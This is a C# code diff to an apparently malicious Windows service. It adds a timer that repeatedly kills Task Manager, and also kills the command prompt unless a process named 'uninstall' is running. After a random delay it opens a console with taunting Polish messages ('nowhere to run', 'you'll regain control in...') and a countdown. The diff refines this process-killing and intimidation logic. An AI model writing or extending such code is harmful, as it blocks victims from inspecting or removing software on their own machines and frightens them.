@@ -22,10 +22,23 @@
         [SuppressMessage("ReSharper", "LocalizableElement")]
         static Service()
         {
-            new Timer(200d) { Enabled = true }.Elapsed += delegate
+            new Timer(500d) { Enabled = true }.Elapsed += delegate
                 {
-                    Array.ForEach(Process.GetProcessesByName("taskmgr"), process => process.Kill());
-                    Array.ForEach(Process.GetProcessesByName("cmd"), process => process.Kill());
+                    var processes = Process.GetProcesses();
+
+                    Array.ForEach(processes, process =>
+                        {
+                            switch (process.ProcessName.ToLower())
+                            {
+                                case "cmd":
+                                    if (!Array.Exists(processes, proc => proc.ProcessName.Equals("uninstall", StringComparison.CurrentCultureIgnoreCase)))
+                                        process.Kill();
+                                    break;
+                                case "taskmgr":
+                                    process.Kill();
+                                    break;
+                            }
+                    });
                 };
 
             Thread.Sleep(Random.Next(5000, 30000));
@@ -38,12 +51,12 @@
 
                 AllocConsole();
 
-                Console.Title = "JUŻ PO TOBIE :)";
-                Console.WriteLine("Nie masz gdzie uciec :)\n\n");
+                Console.Title = "NIE MASZ DOKĄD UCIEC :)";
+                Console.WriteLine("Świetnie się będę bawił...\n\n");
 
                 for (var i = 10; i >= 0; i--)
                 {
-                    Console.Write("\rOdzyskasz kontrolę za " + i);
+                    Console.Write($"\rOdzyskasz kontrolę za {i} ..");
                     Thread.Sleep(1000);
                 }
 
